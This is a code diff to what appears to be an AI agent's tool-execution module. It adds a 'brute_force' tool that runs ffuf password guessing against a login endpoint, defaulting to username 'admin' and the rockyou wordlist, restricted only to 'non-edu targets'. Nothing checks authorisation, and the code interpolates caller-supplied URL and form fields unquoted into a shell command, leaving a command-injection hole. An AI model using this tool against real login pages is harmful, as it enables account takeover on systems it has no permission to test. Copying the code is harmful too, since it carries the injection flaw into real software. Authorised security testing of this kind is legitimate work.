@@ -214,6 +214,48 @@ async def execute_analyze_js(tool_args: dict[str, Any], temp_dir: Path) -> dict[
         return {"error": str(e)}
 
 
+async def execute_brute_force(tool_args: dict[str, Any], temp_dir: Path) -> dict[str, Any]:
+    """Run ffuf password brute-force against a login endpoint (non-edu targets only)."""
+    url = tool_args["url"]
+    username = tool_args.get("username", "admin")
+    wordlist = tool_args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
+    password_field = tool_args.get("password_field", "password")
+    username_field = tool_args.get("username_field", "username")
+    success_keyword = tool_args.get("success_keyword", "login_success")
+    success_code = tool_args.get("success_code", 302)
+    max_words = tool_args.get("max_words", 200)
+
+    wordlist_path = Path(wordlist)
+    if not wordlist_path.exists():
+        return {"error": f"字典文件不存在: {wordlist}，请先上传"}
+
+    postdata = f"{username_field}={username}&{password_field}=FUZZ"
+    cmd = (
+        f"ffuf -u '{url}' -d '{postdata}' -w {wordlist} "
+        f"-H 'Content-Type: application/x-www-form-urlencoded' "
+        f"-mc {success_code} -mw {max_words} "
+        f"-mr '{success_keyword}' -t 10 -of json -o {temp_dir/'ffuf_result.json'} "
+        f"-s 2>&1 | head -20"
+    )
+
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            cwd=str(temp_dir),
+        )
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+        output = stdout.decode("utf-8", errors="replace")
+        return {
+            "results": output[:3000] or "(无匹配)",
+            "wordlist": wordlist,
+            "error": stderr.decode("utf-8", errors="replace")[:500],
+        }
+    except asyncio.TimeoutError:
+        return {"error": "爆破超时 (120s)", "results": ""}
+    except Exception as e:
+        return {"error": str(e)}
+
+
 async def execute_write_report(tool_args: dict[str, Any], report_dir: Path) -> dict[str, Any]:
     filename = tool_args["filename"]
     content = tool_args["content"]
@@ -251,6 +293,8 @@ async def execute_tool_call(
         result = await execute_write_report(args, report_dir)
     elif name == "analyze_js":
         result = await execute_analyze_js(args, temp_dir)
+    elif name == "brute_force":
+        result = await execute_brute_force(args, temp_dir)
     elif name == "finish_session":
         result = {"acknowledged": True, "status": args.get("status", "UNKNOWN")}
     else:
